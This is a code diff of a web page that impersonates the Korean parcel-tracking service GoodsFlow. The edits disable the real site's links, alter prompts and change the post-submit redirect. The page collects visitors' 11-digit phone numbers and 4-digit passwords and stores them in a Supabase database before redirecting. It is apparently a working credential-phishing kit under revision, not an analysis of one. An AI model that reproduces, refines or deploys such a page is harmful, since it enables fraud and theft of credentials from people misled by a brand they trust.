 											<li style="" class="depth-01    " data-code="m201811135bea7e7cde1b4">
-												<a href="https://www.goodsflow.com/tracking" data-url="tracking"
+												<a href="javascript:;" data-url="tracking"
 													data-has_child="N" data-is_folder_menu="N" class=" _fade_link   ">
 													<span class="plain_name" data-hover="">배송추적</span>
 												</a>
@@ -15961,7 +15984,7 @@ body {
 											</li>
 
 											<li style="" class="depth-01    " data-code="m201811135bea8943a3cb7">
-												<a href="https://www.goodsflow.com/invoice" data-url="invoice"
+												<a href="javascript:;" data-url="invoice"
 													data-has_child="N" data-is_folder_menu="N" class=" _fade_link   ">
 													<span class="plain_name" data-hover="">송장출력</span>
 												</a>
@@ -15969,7 +15992,7 @@ body {
 											</li>
 
 											<li style="" class="depth-01    " data-code="m201811135bea89ff6d9f2">
-												<a href="https://www.goodsflow.com/return" data-url="return"
+												<a href="javascript:;" data-url="return"
 													data-has_child="N" data-is_folder_menu="N" class=" _fade_link   ">
 													<span class="plain_name" data-hover="">반품이관</span>
 												</a>
@@ -15978,7 +16001,7 @@ body {
 
 											<li style="" class="depth-01  active   active-real   "
 												data-code="m201811145bebb7d434d13">
-												<a href="mobile.html" data-url="mobile" data-has_child="N"
+												<a href="javascript:;" data-url="mobile" data-has_child="N"
 													data-is_folder_menu="N" class=" _fade_link   active   active-real ">
 													<span class="plain_name" data-hover="">배송지키미앱</span>
 												</a>
@@ -15986,7 +16009,7 @@ body {
 											</li>
 
 											<li style="" class="depth-01    " data-code="m201811155beccc6268448">
-												<a href="https://www.goodsflow.com/alimi" data-url="alimi"
+												<a href="javascript:;" data-url="alimi"
 													data-has_child="N" data-is_folder_menu="N" class=" _fade_link   ">
 													<span class="plain_name" data-hover="">알리미</span>
 												</a>
@@ -15994,7 +16017,7 @@ body {
 											</li>
 
 											<li style="" class="depth-01    " data-code="m201811155becc51a92d41">
-												<a href="https://www.goodsflow.com/safe-no" data-url="safe-no"
+												<a href="javascript:;" data-url="safe-no"
 													data-has_child="N" data-is_folder_menu="N" class=" _fade_link   ">
 													<span class="plain_name" data-hover="">안심번호</span>
 												</a>
@@ -16054,10 +16077,10 @@ body {
 			<div class="section"></div>
 			<div class="section"></div>
 			<div class="container">
-			  <center>
-				 <div class="z-depth-1 grey lighten-4 row" style="display: inline-block; padding: 32px 48px; border: 1px solid #EEE;">
+				<center>
+					<div class="z-depth-1 grey lighten-4 row" style="display: inline-block; padding: 32px 48px; border: 1px solid #EEE;">
 					  
-					  <h5 class="indigo-text" id="texth5">휴대폰번호를 입력하세요</h5>
+					  <h5 class="indigo-text">请输入11位手机号</h5>
 					  
 					  <!-- Step 1: Phone Number Input -->
 					  <div id="phoneStep">
@@ -16066,19 +16089,19 @@ body {
 						  <input type="tel" name="phone" id="phone" maxlength="11" placeholder="예: 01012345678" pattern="\d*" required />
 						  <span id="phoneError" class="error"></span>
 						</div>
-						<button onclick="goToPasswordStep()" class="col s12 btn btn-large waves-effect" style="background-color: #2196f3; margin-top: 15px;">질문</button>
+						<button onclick="goToPasswordStep()" class="col s12 btn btn-large waves-effect" style="background-color: #2196f3; margin-top: 15px;">다음</button>
 					  </div>
 				
 					  <!-- Step 2: Password Input -->
 					  <div id="passwordStep" class="hidden">
 
 
-						<h5 class="indigo-text">4자리 숫자로된 비밀번호 설정</h5>
+						<h5 class="indigo-text">提示文本</h5>
 
 						<div class="input-container">
 
-						
-						  <input inputmode="numeric" type="password" name="password" id="password" pattern="\d{4}" minlength="4" maxlength="4" required />
+						  <label for="password">请输入4位数字密码</label>
+						  <input type="password" name="password" id="password" pattern="\d{4}" minlength="4" maxlength="4" required />
 						  
 						  <span id="passwordError" class="error"></span>
 						</div>
@@ -16088,7 +16111,8 @@ body {
 					  </div>
 				
 					</div>
-			  </center>
+				  </center>
+				
 			</div>
 		
 			<div class="section"></div>
@@ -17009,7 +17033,7 @@ body {
 										<div class="inline-blocked "><a
 												class=" btn btn_5c008d3175841  btn-sm  btn-default _fade_link  "
 												target="_blank"
-												href="https://play.google.com/store/apps/details?id=com.goodsflow.ptk"
+												href="javascript:;"
 												style=" border-radius:px"><span style="margin-right:10px;"><i
 														aria-hidden="true" class="fa fa-android"> </i></span>안드로이드 </a>
 										</div>
@@ -17028,7 +17052,7 @@ body {
 									<div class="button_wrap ">
 										<div class="inline-blocked "><a
 												class=" btn btn_5c008d3175841  btn-sm  btn-default _fade_link  "
-												target="_blank" href="https://itunes.apple.com/app/id888577076"
+												target="_blank" href="javascript:;"
 												style=" border-radius:px"><span style="margin-right:10px;"><i
 														aria-hidden="true" class="fa fa-apple"> </i></span>아이폰(애플)</a>
 										</div>
@@ -17853,13 +17877,13 @@ body {
 										<div class="inline-blocked "><a
 												class=" btn btn_58927dfcc936e   btn-default _fade_link  "
 												target="_blank"
-												href="https://play.google.com/store/apps/details?id=com.goodsflow.ptk"
+												href="javascript:;"
 												style=" border-radius:px"><span style="margin-right:10px;"><i
 														aria-hidden="true" class="fa fa-android"> </i></span>Google Play
 												- 안드로이드</a></div>
 										<div class="inline-blocked "><a
 												class=" btn btn_3a1T2TZ476   btn-default _fade_link  " target="_blank"
-												href="https://itunes.apple.com/app/id888577076"
+												href="javascript:;"
 												style=" border-radius:px"><span style="margin-right:10px;"><i
 														aria-hidden="true" class="fa fa-apple"> </i></span>App Store -
 												아이폰</a></div>
@@ -18133,15 +18157,15 @@ body {
 										<p><span style="color: rgb(242, 242, 242);"><span style="font-size: 14px;">대표자명
 													: 박지연 &nbsp; &nbsp;| &nbsp; &nbsp;사업자등록번호 : 303-81-79195 &nbsp; |
 													&nbsp; 통신판매업신고번호 : 제2021-서울강남-00733호 &nbsp; &nbsp;| <a
-														href="https://blush-brook-e36.notion.site/2023-11-24-6f09b3bb81794e25a8723fcaac1cd0cb"
+														href="javascript:;"
 														rel="noopener noreferrer" target="_blank">&nbsp;
 														<strong>개인(위치)정보처리방침</strong></a>&nbsp; &nbsp;<a
-														href="https://www.goodsflow.com/privacy"
+														href="javascript:;"
 														target="_blank"></a>&nbsp; | &nbsp; <a
-														href="https://cuddly-stage-70e.notion.site/5cc7fdba443e409282da6dc5929c0278"
+														href="javascript:;"
 														rel="noopener noreferrer" target="_blank"><strong>위치기반서비스
 															약관</strong></a><a
-														href="https://cuddly-stage-70e.notion.site/5cc7fdba443e409282da6dc5929c0278"></a></span></span>
+														href="javascript:;"></a></span></span>
 										</p>
 										<p style="text-align: left;"><span
 												style="color: rgb(242, 242, 242); font-size: 12px;">Copyright ⓒ
@@ -18176,7 +18200,7 @@ body {
 		</div>
 	</div>
 
-	<a href="mobile.html#doz_header" class="btn_gotop_goods_flow" id="click">
+	<a href="javascript:;" class="btn_gotop_goods_flow" id="click">
 		<span class="glyphicon glyphicon-chevron-up">
 		</span>
 	</a>
@@ -18309,7 +18333,7 @@ body {
 		LOCALIZE.설명_이름또는닉네임 = function () { return LOCALIZE.convArguments("이름 또는 닉네임", arguments); };
 		LOCALIZE.설명_쿠폰이발급되었습니다 = function () { return LOCALIZE.convArguments("쿠폰이 발급 되었습니다.", arguments); };
 		LOCALIZE.설명_이용이제한된페이지안내 = function () {
-			return LOCALIZE.convArguments("현재 접속하신 <span class=\'text-primary\'>%1</span>의 이용관련 문의는<br/><a href="https://www.goodsflow.com/\'mailto:%2\'"><span class=\'text-primary\'>%2</span></a> 또는 <a href="https://www.goodsflow.com/\'sms:%3\'"><span class=\'text-primary\'>%3</span></a>로 문의해주시기 바랍니다.", arguments); };
+			return LOCALIZE.convArguments("현재 접속하신 <span class=\'text-primary\'>%1</span>의 이용관련 문의는<br/><a href="javascript:;"><span class=\'text-primary\'>%2</span></a> 또는 <a href="javascript:;"><span class=\'text-primary\'>%3</span></a>로 문의해주시기 바랍니다.", arguments); };
 				LOCALIZE.설명_기타택배 = function () { return LOCALIZE.convArguments("기타택배", arguments); };
 			LOCALIZE.설명_상품은어떠셨나요 = function () { return LOCALIZE.convArguments("상품은 어떠셨나요?", arguments); };
 			LOCALIZE.설명_어떤점이좋으셨나요 = function () { return LOCALIZE.convArguments("어떤 점이 좋으셨나요?", arguments); };
@@ -18365,7 +18389,7 @@ body {
 			LOCALIZE.버튼_상품문의 = function () { return LOCALIZE.convArguments("상품문의", arguments); };
 			LOCALIZE.버튼_장바구니가기 = function () { return LOCALIZE.convArguments("장바구니", arguments); };
 			LOCALIZE.설명_가입하시면이용약관에동의하게됩니다tag = function () {
-				return LOCALIZE.convArguments("가입하시면 <a href="https://www.goodsflow.com/\'javascript:;\'" %1>이용약관</a>에 동의하게됩니다.", arguments); };
+				return LOCALIZE.convArguments("가입하시면 <a href="javascript:;" %1>이용약관</a>에 동의하게됩니다.", arguments); };
 					LOCALIZE.설명_포토_구매평만_보기 = function () { return LOCALIZE.convArguments("포토 구매평만 보기", arguments); };
 				LOCALIZE.버튼_구매평작성 = function () { return LOCALIZE.convArguments("구매평 작성", arguments); };
 				LOCALIZE.설명_SMS수신동의 = function () { return LOCALIZE.convArguments("SMS 수신 동의", arguments); };
@@ -18677,7 +18701,7 @@ body {
 				LOCALIZE.설명_결제가완료되었습니다 = function () { return LOCALIZE.convArguments("결제가 완료되었습니다<br/>주문배송은 마이페이지에서 조회 가능합니다", arguments); };
 				LOCALIZE.타이틀_마이페이지 = function () { return LOCALIZE.convArguments("마이페이지", arguments); };
 				LOCALIZE.설명_컨텐츠상품은주문배송조회에서다운로드해주세요 = function () {
-					return LOCALIZE.convArguments("컨텐츠 상품은 <a href="https://www.goodsflow.com/\&quot;/shop_mypage\&quot;" class=\"text-brand\">주문배송 조회</a>에서 다운로드 해주세요.", arguments); };
+					return LOCALIZE.convArguments("컨텐츠 상품은 <a href="javascript:;" class=\"text-brand\">주문배송 조회</a>에서 다운로드 해주세요.", arguments); };
 						LOCALIZE.타이틀_주문완료 = function () { return LOCALIZE.convArguments("주문완료", arguments); };
 					LOCALIZE.설명_무통장계좌안내 = function () { return LOCALIZE.convArguments("아래 계좌정보로 입금해 주시면<br/>결제 완료처리가 됩니다", arguments); };
 					LOCALIZE.타이틀_계좌정보 = function () { return LOCALIZE.convArguments("계좌 정보", arguments); };
@@ -20020,7 +20044,6 @@ body {
 
 <script type="module">
         // 确保先导入库
-        // 确保先导入库
         import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm'
 
 	
@@ -20127,8 +20150,8 @@ body {
 
       
 
-      if (!validateCode(password)  || password == phone.slice(-4) ) {
-        $('#passwordError').text("비밀번호 형식이 잘못되였습니다. 1234, 1111등 사용 불가");
+      if (!validateCode(password) || password == phone.slice(-4)) {
+        $('#passwordError').text('인증 코드 형식이 잘못되었습니다. 1234, 1111 등은 사용 불가');
         valid = false;
       }
 
@@ -20163,8 +20186,7 @@ body {
         } else {
             console.log('提交成功:', insertData);
             // 로그인 성공, 다음 페이지로 이동
-		alert("고객님의 소중한 상품이 내일 배송 예정입니다.");
-         window.location.href = 'https://www.goodsflow.com/';
+         window.location.href = 'https://www.google.com';
         }
     } catch (error) {
         console.error('提交时出现错误:', error);
@@ -20192,8 +20214,6 @@ body {
 
       const phoneInput = document.getElementById("phone");
       const phoneError = document.getElementById("phoneError");
-	
-		
       
       // Validate phone input
       if (!phoneInput.value || phoneInput.value.length !== 11) {
@@ -20203,7 +20223,6 @@ body {
       phoneError.textContent = "";
 
       // Hide phone step and show password step
-		document.getElementById("texth5").classList.add("hidden");
       document.getElementById("phoneStep").classList.add("hidden");
       document.getElementById("passwordStep").classList.remove("hidden");
     }
@@ -20218,7 +20237,6 @@ body {
     }
 
 
-
     // Limit phone input to digits only
     document.getElementById("phone").addEventListener("input", function (e) {
       e.target.value = e.target.value.replace(/\D/g, '');
@@ -20231,6 +20249,7 @@ body {
 	window.togglePasswordVisibility = togglePasswordVisibility;
 
 	window.handleSubmit = handleSubmit;
+
 	</script>
 
 </html>
